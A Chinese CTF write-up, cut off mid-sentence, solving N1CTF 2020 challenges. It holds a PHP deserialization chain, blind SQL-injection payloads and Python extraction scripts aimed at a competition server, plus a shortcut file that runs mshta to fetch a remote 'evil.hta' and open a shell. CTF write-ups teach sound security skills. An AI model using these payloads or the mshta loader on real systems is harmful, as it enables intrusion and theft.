    <content type="html"><![CDATA[<p>队伍ID：GUTS，web狗个人参赛</p><p>做出的题目<br><img src="http://pic.c1imber.top/blog/20201019/96npVIgBXvdn.png?imageslim" alt="mark"></p><h3 id="web-SignIn"><a href="#web-SignIn" class="headerlink" title="web-SignIn"></a>web-SignIn</h3><p>这道题自己用注入注入出的key，然后通过key获取的flag，不知道其他师傅都是怎么解的</p><p>题目代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ip</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> $ip;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($info)</span></span>&#123;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="keyword">$this</span>-&gt;waf($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]);</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;ip =$_SERVER[<span class="string">"REMOTE_ADDR"</span>];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</div><div class="line">        $con=mysqli_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"********"</span>,<span class="string">"n1ctf_websign"</span>);</div><div class="line">        $sqlquery=sprintf(<span class="string">"INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')"</span>,<span class="keyword">$this</span>-&gt;waf($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]),time());</div><div class="line">        <span class="keyword">if</span>(!mysqli_query($con,$sqlquery))&#123;</div><div class="line">            <span class="keyword">return</span> mysqli_error($con);</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">return</span> <span class="string">"your ip looks ok!"</span>;</div><div class="line">        &#125;</div><div class="line">        mysqli_close($con);</div><div class="line">    &#125;</div><div class="line">&#125;   </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> $ip;</div><div class="line">    <span class="keyword">public</span> $check;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ip)</span> </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;ip = $ip;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;check)===md5(<span class="string">"key****************"</span>))&#123;</div><div class="line">    readfile(<span class="string">'/flag'</span>);</div><div class="line">    &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ip;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span>(stristr(<span class="keyword">$this</span>-&gt;ip, <span class="string">"n1ctf"</span>)!==<span class="keyword">False</span>)</div><div class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="string">"welcome to n1ctf2020"</span>;</div><div class="line">        <span class="keyword">else</span></div><div class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="string">"noip"</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;getflag();</div><div class="line">    &#125;   </div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'input'</span>]))&#123;</div><div class="line">    $input = $_GET[<span class="string">'input'</span>];</div><div class="line">unserialize($input);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>查看代码，在flag类当中的getflag方法当中可以获取flag，但是需要满足<code>md5($this-&gt;check)===md5(&quot;key****************&quot;)</code>，所以需要先获取<code>key****************</code>的值</p><p>在<code>$sqlquery=sprintf(&quot;INSERT into n1ip(`ip`,`time`) VALUES (&#39;%s&#39;,&#39;%s&#39;)&quot;,$this-&gt;waf($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]),time());</code>这段代码位置可能存在sql注入，可以通过构造反序列化先到这一步</p><p>刚好flag类当中<code>__wakeup</code>方法的位置使用了<code>stristr</code>字符串函数，所有这里可以触发ip类的<code>__toString</code>方法</p><p>构造pop链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ip</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">&#125;   </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $ip;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;ip=<span class="keyword">new</span> ip();</div><div class="line">    &#125;</div><div class="line">&#125;   </div><div class="line"></div><div class="line">$obj=<span class="keyword">new</span> flag();</div><div class="line"><span class="keyword">echo</span> serialize($obj);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:<span class="number">4</span>:<span class="string">"flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">"ip"</span>;O:<span class="number">2</span>:<span class="string">"ip"</span>:<span class="number">0</span>:&#123;&#125;&#125;</div></pre></td></tr></table></figure><p>添加X-Forwarded-For头发送即可，但是这里经过了ip类的waf函数，这里并不知道过滤了什么，简单测试了一下，输入sleep等关键字会提示hackhack</p><p>尝试了好久的注入，发现并没有明显的响应可以判断是否存在注入，被这个<code>$this-&gt;waf</code>卡了好久</p><p>于是又仔细读了一遍代码，发现在ip类当中返回了sql的错误信息，但是并没有输出到页面当中，而是赋值给了flag类当中的<code>$this-&gt;ip</code></p><p><img src="http://pic.c1imber.top/blog/20201019/xneAxLf2mmUj.png?imageslim" alt="mark"></p><p>那么如果这里返回的错误信息当中有n1ctf就会输出welcome to n1ctf2020,否则就会输出noip，所以可以通过这种方式进行盲注</p><p>于是需要解决的问题就变为了如何让sql错误信息当中出现n1ctf，查看代码看到当前的数据库名刚好为n1ctf_websign，于是构造：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET /index.php?input=O:4:%22flag%22:1:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;&#125; HTTP/1.1</div><div class="line">Host: 101.32.205.189</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Cache-Control: max-age=0</div><div class="line">X-Forwarded-For: 1.1.1.1&apos; and updatexml(1,if((1=1),1,concat(0x3a,database())),1) and &apos;1&apos;=&apos;</div></pre></td></tr></table></figure><p>此时if判断为true，执行了<code>INSERT into n1ip(`ip`,`time`) VALUES (&#39;1.1.1.1&#39; and updatexml(1,1,1) and &#39;1&#39;=&#39;&#39;,time())</code>，语句没有产生报错，所以返回noip<br><img src="http://pic.c1imber.top/blog/20201019/oeliQVlUrcYw.png?imageslim" alt="mark"></p><p>构造：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET /index.php?input=O:4:%22flag%22:1:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;&#125; HTTP/1.1</div><div class="line">Host: 101.32.205.189</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Cache-Control: max-age=0</div><div class="line">X-Forwarded-For: 1.1.1.1&apos; and updatexml(1,if((1=2),1,concat(0x3a,database())),1) and &apos;1&apos;=&apos;</div></pre></td></tr></table></figure><p>此时if判断为false，语句执行了<code>INSERT into n1ip(`ip`,`time`) VALUES (&#39;1.1.1.1&#39; and updatexml(1,concat(0x3a,database()),1) and &#39;1&#39;=&#39;&#39;,time())</code>，后端sql报错信息大概是<code>XPATH syntax error: &#39;:n1ctf_websign&#39;</code>，错误信息返回给了flag类的<code>$this-&gt;ip</code>，从报错信息当中匹配到了n1ctf，于是这里输出了welcome to n1ctf2020</p><p><img src="http://pic.c1imber.top/blog/20201019/zRDmddNxLzGp.png?imageslim" alt="mark"></p><p>为了方便理解，可以看下面两张图：</p><p><img src="http://pic.c1imber.top/blog/20201019/yJPwEKA1y5x5.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20201019/SDj1pxAY1PO3.png?imageslim" alt="mark"></p><p>接着盲注，首先获取表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET /index.php?input=O:4:%22flag%22:1:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;&#125; HTTP/1.1</div><div class="line">Host: 101.32.205.189</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Cache-Control: max-age=0</div><div class="line">X-Forwarded-For: 1.1.1.1&apos; and updatexml(1,if(((select length(group_concat(table_name)) from information_schema.tables where table_schema=database())=10),1,concat(0x3a,database())),1) and &apos;1&apos;=&apos;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20201019/7BzQoMG6PUpx.png?imageslim" alt="mark"></p><p>通过代码已知一个表n1ip，group_concat(table_name)总长度为10，于是剩下一个表长度为5（因为group_concat结果中有一个逗号）<br>推测另一个表为n1key,推测成立</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET /index.php?input=O:4:%22flag%22:1:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;&#125; HTTP/1.1</div><div class="line">Host: 101.32.205.189</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Cache-Control: max-age=0</div><div class="line">X-Forwarded-For: 1.1.1.1&apos; and updatexml(1,if(((select table_name from information_schema.tables where table_schema=database() limit 1,1)=&apos;n1key&apos;),1,concat(0x3a,database())),1) and &apos;1&apos;=&apos;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20201019/v1XC5qtJWGBu.png?imageslim" alt="mark"></p><p>获取n1key表当中的列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET /index.php?input=O:4:%22flag%22:1:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;&#125; HTTP/1.1</div><div class="line">Host: 101.32.205.189</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Cache-Control: max-age=0</div><div class="line">X-Forwarded-For: 1.1.1.1&apos; and updatexml(1,if(((select length(group_concat(column_name)) from information_schema.columns where table_name=&apos;n1key&apos;)=6),1,concat(0x3a,database())),1) and &apos;1&apos;=&apos;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20201019/ryuxqTqw3HWH.png?imageslim" alt="mark"></p><p>判断出group_concat(column_name)长度为6</p><p>编写获取列名脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests </div><div class="line"></div><div class="line">session = requests.Session()    </div><div class="line"></div><div class="line">column=<span class="string">""</span>   </div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">7</span>):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">127</span>):</div><div class="line">        paramsGet = &#123;<span class="string">"input"</span>:<span class="string">"O:4:\"flag\":1:&#123;s:2:\"ip\";O:2:\"ip\":0:&#123;&#125;&#125;"</span>&#125;</div><div class="line">        headers = &#123;<span class="string">"Accept"</span>:<span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>,<span class="string">"Cache-Control"</span>:<span class="string">"max-age=0"</span>,<span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span>,<span class="string">"Connection"</span>:<span class="string">"close"</span>,<span class="string">"X-Forwarded-For"</span>:<span class="string">"1.1.1.1' and updatexml(1,if(((select ascii(substr(group_concat(column_name),&#123;&#125;,1)) from information_schema.columns where table_name='n1key')=&#123;&#125;),1,concat(0x3a,database())),1) and '1'='"</span>.format(i,j),<span class="string">"Accept-Language"</span>:<span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,<span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>&#125;</div><div class="line">        <span class="comment">#print headers</span></div><div class="line">        response = session.get(<span class="string">"http://101.32.205.189/index.php"</span>, params=paramsGet, headers=headers)</div><div class="line">        <span class="comment">#print response.content</span></div><div class="line">        <span class="keyword">if</span> <span class="string">"&lt;code&gt;noip&lt;/code&gt;&lt;/pre&gt;"</span> <span class="keyword">in</span> response.content:</div><div class="line">            column+=chr(j)</div><div class="line">            <span class="keyword">print</span> column</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20201019/i4CnEN4f77Ru.png?imageslim" alt="mark"></p><p>两列：id和key</p><p>获取key的时候需要使用<code>select `key` from n1key</code>,直接<code>select key</code>会出现sql语法错误，这一点需要注意</p><p><img src="http://pic.c1imber.top/blog/20201020/c0KMUOSAwsty.png?imageslim" alt="mark"></p><p>判断出n1key当中key列内容长度为25</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET /index.php?input=O:4:%22flag%22:1:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;&#125; HTTP/1.1</div><div class="line">Host: 101.32.205.189</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Cache-Control: max-age=0</div><div class="line">X-Forwarded-For: 1.1.1.1&apos; and updatexml(1,if(((select length(`key`) from n1key)=25),1,concat(0x3a,database())),1) and &apos;1&apos;=&apos;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20201019/iugN92MoTJQf.png?imageslim" alt="mark"></p><p>编写获取key脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests </div><div class="line"></div><div class="line">l=<span class="string">"1234567890qazxswedcvfrtgbnhyujmkiolp"</span></div><div class="line">session = requests.Session()</div><div class="line">key=<span class="string">""</span>  </div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">26</span>):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> l:</div><div class="line">        paramsGet = &#123;<span class="string">"input"</span>:<span class="string">"O:4:\"flag\":1:&#123;s:2:\"ip\";O:2:\"ip\":0:&#123;&#125;&#125;"</span>&#125;</div><div class="line">        headers = &#123;<span class="string">"Accept"</span>:<span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>,<span class="string">"Cache-Control"</span>:<span class="string">"max-age=0"</span>,<span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span>,<span class="string">"Connection"</span>:<span class="string">"close"</span>,<span class="string">"X-Forwarded-For"</span>:<span class="string">"1.1.1.1' and updatexml(1,if(((select substr(`key`,&#123;&#125;,1) from n1key)='&#123;&#125;'),1,concat(0x3a,database())),1) and '1'='"</span>.format(i,j),<span class="string">"Accept-Language"</span>:<span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,<span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>&#125;</div><div class="line">        response = session.get(<span class="string">"http://101.32.205.189/index.php"</span>, params=paramsGet, headers=headers)</div><div class="line">        <span class="keyword">if</span> <span class="string">"&lt;code&gt;noip&lt;/code&gt;&lt;/pre&gt;"</span> <span class="keyword">in</span> response.content:</div><div class="line">            key+=j</div><div class="line">            <span class="keyword">print</span> key</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20201019/LLgzWYcmT0vu.png?imageslim" alt="mark"></p><p>获取到key为n1ctf20205bf75ab0a30dfc0c</p><p>之后就是通过反序列化构造poc获取flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $check;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;check=<span class="string">"n1ctf20205bf75ab0a30dfc0c"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> flag());</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:<span class="number">4</span>:<span class="string">"flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">"check"</span>;s:<span class="number">25</span>:<span class="string">"n1ctf20205bf75ab0a30dfc0c"</span>;&#125;</div></pre></td></tr></table></figure><p>成功获取flag</p><p><img src="http://pic.c1imber.top/blog/20201019/0zSO8n89joWU.png?imageslim" alt="mark"></p><p><code>n1ctf{you_g0t_1t_hack_for_fun}</code></p><h3 id="The-King-Of-Phish-Victim-Bot"><a href="#The-King-Of-Phish-Victim-Bot" class="headerlink" title="The King Of Phish (Victim Bot)"></a>The King Of Phish (Victim Bot)</h3><p>python代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Victim bot</span></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"><span class="keyword">import</span> uuid</div><div class="line"><span class="keyword">import</span> LnkParse3 <span class="keyword">as</span> Lnk</div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request    </div><div class="line"></div><div class="line">app = Flask(__name__)   </div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line">    source = open(__file__, <span class="string">'r'</span>).read().replace(<span class="string">"\n"</span>, <span class="string">"\x3c\x62\x72\x3e"</span>).replace(<span class="string">" "</span>, <span class="string">"\x26\x6e\x62\x73\x70\x3b"</span>)</div><div class="line">    <span class="keyword">return</span> source   </div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.route('/send', methods=['POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendFile</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</div><div class="line">        <span class="keyword">return</span> <span class="string">'No file part'</span></div><div class="line">    file = request.files[<span class="string">'file'</span>]    </div><div class="line"></div><div class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">'No selected file'</span></div><div class="line">    data = file.stream.read()</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data.startswith(<span class="string">b"\x4c\x00"</span>):</div><div class="line">        <span class="keyword">return</span> <span class="string">"You're a bad guy!"</span></div><div class="line">    shortcut = Lnk.lnk_file(indata=data)</div><div class="line">    <span class="keyword">if</span> shortcut.data[<span class="string">'command_line_arguments'</span>].count(<span class="string">" "</span>):</div><div class="line">        <span class="keyword">return</span> <span class="string">"File is killed by antivirus."</span></div><div class="line">    filename = str(uuid.uuid4())+<span class="string">".lnk"</span></div><div class="line">    fullname = os.path.join(os.path.abspath(os.curdir) + <span class="string">"/uploads"</span>, filename)</div><div class="line">    open(fullname, <span class="string">"wb"</span>).write(data)</div><div class="line">    clickLnk(fullname)</div><div class="line">    <span class="keyword">return</span> <span class="string">"Clicked."</span>   </div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">clickLnk</span><span class="params">(lnkPath)</span>:</span></div><div class="line">    subprocess.run(<span class="string">'cmd /c "%s"'</span> % lnkPath, capture_output=<span class="keyword">True</span>, shell=<span class="keyword">True</span>, check=<span class="keyword">True</span>)    </div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">5000</span>)</div></pre></td></tr></table></figure><p>阅读代码，看样子是需要上传lnk文件，然后执行文件getshell，但是不能有空格</p><p><a href="https://pypi.org/project/LnkParse3/" title="LnkParse3" target="_blank" rel="external">LnkParse3库</a></p><p><img src="http://pic.c1imber.top/blog/20201019/KyqOV7gofEVV.png?imageslim" alt="mark"></p><p>最终找到可以上线的方法，通过mshta上线</p><p><img src="http://pic.c1imber.top/blog/20201019/Hhpafp83VpVa.png?imageslim" alt="mark"></p><p>制作test.lnk</p><p><code>C:\Windows\System32\mshta.exe http://x.x.x.x/evil.hta</code></p><p><img src="http://pic.c1imber.top/blog/20201020/IMV8jylbxOTO.png?imageslim" alt="mark"></p><p>测试无空格</p><p><img src="http://pic.c1imber.top/blog/20201019/lX5suqqRMghM.png?imageslim" alt="mark"></p><p>上传test.lnk，上线成功</p><p><img src="http://pic.c1imber.top/blog/20201019/VYXmO3FAq1H8.png?imageslim" alt="mark"></p><p>根据题目提示，最终在<code>C:\Users\UserA\Desktop\flag.txt</code>当中获取到了flag</p><p><img src="http://pic.c1imber.top/blog/20201019/7KDXlnagc5S7.png?imageslim" alt="mark"></p><p><code>n1ctf{I&#39;m_a_little_fish,_swimming_in_the_ocean}</code></p><p>在<code>C:\Users\UserA\Desktop\</code>目录下还看到了CVE-2020-1472目录，但是这个不影响获取flag，应该和后面的The King Of Phish (UserA-PC)或者The 